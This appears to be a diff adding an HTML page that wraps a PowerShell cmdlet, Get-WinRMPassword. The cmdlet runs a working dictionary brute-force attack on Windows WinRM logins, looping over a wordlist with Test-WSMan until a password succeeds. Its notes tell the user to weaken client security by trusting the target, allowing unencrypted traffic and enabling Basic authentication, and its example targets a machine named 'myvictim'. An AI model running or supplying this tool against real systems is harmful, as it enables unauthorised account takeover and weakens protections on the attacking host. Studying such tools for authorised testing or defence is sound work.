@@ -1,0 +1,98 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Get-WinRMPassword</title>
+</head><body>Function Get-WinRMPassword {<br/>
+&lt;#<br/>
+.SYNOPSIS<br/>
+Simple bruteforce attack upon a Windows machine running WinRM<br/>
+<br/>
+.DESCRIPTION<br/>
+This CMDLet will perform a simplistic bruteforce attack upon a Windows Server or Client running WinRM in either a domain joined or workgroup configuration. <br/>
+The CMDLet will try each UserName + Password Combination until a sucessfuly entry is found or the list is exhausted. If nothing is output, then <br/>
+<br/>
+.PARAMETER UserName<br/>
+The username you wish to gain entry with<br/>
+<br/>
+.PARAMETER ComputerName<br/>
+Target machine<br/>
+<br/>
+.PARAMETER wordlist<br/>
+String path to file containing list of words/passwords<br/>
+<br/>
+.PARAMETER Authentication<br/>
+WinRM auth mechanism, defaults to Negotiate (should work on most systems). See the specifics of the Authentication parameter in test-wsman.<br/>
+<br/>
+.PARAMETER UseSSL<br/>
+Specifies that the Secure Sockets Layer (SSL) protocol should be used to establish a connection to the remote<br/>
+computer. By default, SSL is not used.<br/>
+<br/>
+.EXAMPLE<br/>
+get-winrmpassword -UserName Administrator -ComputerName myvictim -WordList c:\mywordlist.txt<br/>
+Will read mywordlist.txt and for each entry in that list, try Administrator:&lt;entry&gt; <br/>
+<br/>
+.NOTES<br/>
+If you are not in a domain joined (running workgroup), then you should do the following:<br/>
+1. Add the "target" to the WinRM trusted hosts - winrm set winrm/config/client @{TrustedHosts="victim"}<br/>
+2. You may need to enable "unencrypted" (http connections) - winrm set winrm/config/client @{AllowUnencrypted="true"}<br/>
+3. You may need to enable basic auth - winrm set winrm/config/client/auth @{Basic="true"}<br/>
+<br/>
+.INPUTS <br/>
+None<br/>
+This cmdlet does not accept any input.<br/>
+<br/>
+.OUTPUTS <br/>
+None<br/>
+This cmdlet does not generate any output object<br/>
+<br/>
+.LINK<br/>
+http://aperturescience.su/<br/>
+<br/>
+#&gt;<br/>
+<br/>
+[CMDLetBinding()]<br/>
+param (<br/>
+&nbsp; [Parameter(mandatory=$true)] [String] $username,<br/>
+&nbsp; [Parameter(mandatory=$true)] [String] $ComputerName,<br/>
+&nbsp; [Parameter(mandatory=$true)] [String] $wordlist,<br/>
+&nbsp; [String] $Authentication = "Negotiate",<br/>
+&nbsp; [switch] $UseSSL<br/>
+)<br/>
+<br/>
+#read word list (consider pipeline for performance)<br/>
+$wordlistentries = Get-Content $wordlist<br/>
+<br/>
+foreach ($entry in $wordlistentries) {<br/>
+&#09;Write-Verbose "Trying $entry"<br/>
+&#09;<br/>
+&#09;#make a secure string, and then a pscredentials object with username and password<br/>
+&#09;$securepassword = ConvertTo-SecureString $entry -AsPlainText -Force<br/>
+&#09;$pscredentials = New-Object System.Management.Automation.PSCredential ($username, $securepassword)<br/>
+&#09;<br/>
+&#09;#clear error listing<br/>
+&#09;$Error.clear()<br/>
+&#09;<br/>
+&#09;#run the test, taking into account the SSL status<br/>
+&#09;if ($UseSSL) {<br/>
+&#09;&#09;Test-WSMan -ComputerName $ComputerName -Credential $pscredentials -Authentication $Authentication -erroraction SilentlyContinue -UseSSL | Out-Null<br/>
+&#09;} else {<br/>
+&#09;&#09;Test-WSMan -ComputerName $ComputerName -Credential $pscredentials -Authentication $Authentication -erroraction SilentlyContinue | Out-Null<br/>
+&#09;}<br/>
+&#09;<br/>
+&#09;#put the first error into a variable (best practice)<br/>
+&#09;$ourerror = $error[0]<br/>
+&#09;<br/>
+&#09;# if there is no error, then we were successfull, else, was it a username or password error? if it wasn't username/password incorrect, something else is wrong so break the look<br/>
+&#09;if ($ourerror -eq $null) {<br/>
+&#09;&#09;"Password Found: $entry"<br/>
+&#09;&#09;break<br/>
+&#09;} elseif (-not $ourerror.ErrorDetails.Message.Contains("The user name or password is incorrect.")) {<br/>
+&#09;&#09;"Check the settings, confirm host is in TrustedHosts, confirm hostname, check for SSL etc, $($ourerror.ErrorDetails.Message)"<br/>
+&#09;&#09;break <br/>
+&#09;} else {<br/>
+&#09;&#09;Write-Debug "$($ourerror.ErrorDetails.Message)"<br/>
+&#09;}<br/>
+}<br/>
+&#09;<br/>
+}</body></html>
